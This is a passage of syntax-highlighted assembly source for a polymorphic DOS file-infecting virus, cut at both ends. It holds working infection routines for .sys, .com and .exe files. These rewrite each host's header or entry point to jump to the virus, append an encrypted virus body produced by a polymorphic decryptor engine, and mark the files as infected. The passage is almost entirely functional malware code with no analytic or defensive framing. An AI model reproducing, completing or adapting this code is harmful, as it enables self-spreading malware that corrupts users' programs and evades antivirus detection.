                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
</span><span class="sc5">critical_exit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check if close function</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">dos_function</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],(</span><span class="sc2">3Eh</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">no_close_file</span><span class="sc0">

                </span><span class="sc1">;Close file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
</span><span class="sc5">no_close_file</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">m21h_exit</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Infect .sys files                                                         ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">inf_sys</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Don't infect too big .sys files</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc4">-(</span><span class="sc5">mem_byte_size</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">

                </span><span class="sc1">;Check next driver address</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02</span><span class="sc4">],</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">

                </span><span class="sc1">;Copy .sys file header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_header</span><span class="sc0">

                </span><span class="sc1">;Store virus entry point ( file size ) over strategy routine address</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Save delta offset for poly engine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_delta</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Store return subroutine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_sys</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                               </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">

                </span><span class="sc1">;Encrypt and infect</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_control</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Infect .com files                                                         ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">inf_com</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Don't infect too big .com files</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc4">-(</span><span class="sc5">mem_byte_size</span><span class="sc4">*</span><span class="sc2">02h</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">

                </span><span class="sc1">;Save first bytes of file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_header</span><span class="sc0">

                </span><span class="sc1">;Get file length as entry point</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">

                </span><span class="sc1">;Write a jump to virus into header</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc2">0E9h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Save delta offset for poly engine</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0103h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_delta</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Store return subroutine</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_com</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                               </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">

                </span><span class="sc1">;Encrypt and infect</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">get_control</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Infect .exe files                                                         ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">inf_exe</span><span class="sc4">:</span><span class="sc0">       
                </span><span class="sc1">;Make a copy of .exe file header</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">copy_header</span><span class="sc0">

                </span><span class="sc1">;Don't infect Windows new exe files</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">19h</span><span class="sc4">],</span><span class="sc2">0040h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">bad_exe</span><span class="sc0">

                </span><span class="sc1">;Don't infect overlays</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1Ah</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_exe</span><span class="sc0">

                </span><span class="sc1">;Check maxmem field</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc2">0FFFFh</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">bad_exe</span><span class="sc0">

                </span><span class="sc1">;Save file size</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc1">;Save old exe entry point</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_ip</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exe_cs</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;Get file size div 10h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0010h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc1">;Subtract header size</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">

                </span><span class="sc1">;New entry point at file end</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">16h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Save delta offset for poly engine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">file_delta</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc1">;Set new offset of stack segment in load module</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">0Eh</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Set new stack pointer beyond end of virus</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">mem_byte_size</span><span class="sc4">+</span><span class="sc5">inf_byte_size</span><span class="sc4">+</span><span class="sc2">0410h</span><span class="sc0">

                </span><span class="sc1">;Aligment</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0FFFEh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc1">;Restore size</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Resave size        </span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">

                </span><span class="sc1">;Get file size div 0200h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">size_round_1</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">size_round_1</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Check if file size is as header says</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">exit_header</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">ok_file_size</span><span class="sc0">
</span><span class="sc5">exit_header</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">bad_exe</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">
</span><span class="sc5">ok_file_size</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Restore file size</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Add virus size to file size</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc5">inf_byte_size</span><span class="sc0">
                </span><span class="sc6">adc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">0000h</span><span class="sc0">

                </span><span class="sc1">;Get infected file size div 0200h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0200h</span><span class="sc0">
                </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">size_round_2</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">size_round_2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Store new size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">04h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Store return subroutine</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">exit_address</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">exit_exe</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> \
                                               </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">host_ret</span><span class="sc0">

                </span><span class="sc1">;Encryption an infection continues on next routine</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Encryption and infection                                                  ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">get_control</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Reserve memory for poly engine buffer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">memory_allocation</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_good_memory</span><span class="sc0">

                </span><span class="sc1">;Encrypt virus and build polymorphic decryptor</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">do_encrypt</span><span class="sc0">

                </span><span class="sc1">;Write virus body to the end of file</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">inf_byte_size</span><span class="sc0">
                </span><span class="sc6">lds</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_ptr</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">no_good_write</span><span class="sc0">

                </span><span class="sc1">;Seek to beginning of file</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">seek_begin</span><span class="sc0">

                </span><span class="sc1">;Write new header</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">file_header_size</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">file_buffer</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">

                </span><span class="sc1">;Mark file as infected</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">0Dh</span><span class="sc4">],</span><span class="sc2">1Fh</span><span class="sc0">
</span><span class="sc5">no_good_write</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Free previous allocated memory</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">free_memory</span><span class="sc0">
</span><span class="sc5">no_good_memory</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">exit_inf</span><span class="sc0">

</span><span class="sc1">;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;³Memory allocation routine                                                 ³</span><span class="sc0">
</span><span class="sc1">;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">

</span><span class="sc5">memory_allocation</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc1">;Save regs</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">push_all</span><span class="sc0">

                </span><span class="sc1">;Use segment as success flag</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_seg</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">

                </span><span class="sc1">;Get and save memory allocation strategy</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5800h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Set new allocation strategy to first fit in high then low</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5801h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">

                </span><span class="sc1">;Get and save umb link state</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5802h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc1">;Set umb link state on</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5803h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">0001h</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">

                </span><span class="sc1">;Allocate memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">48h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc5">inf_para_size</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">dos_call</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">error_mem_alloc</span><span class="sc0">     

                </span><span class="sc1">;Save pointer to allocated memory</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_off</span><span class="sc4">],</span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">poly_working_seg</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">error_mem_alloc</span><span class="sc4">:</span><span class="sc0">        
                </span><span class="sc1">;Restore umb link state</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5803h</span><span class="sc0">
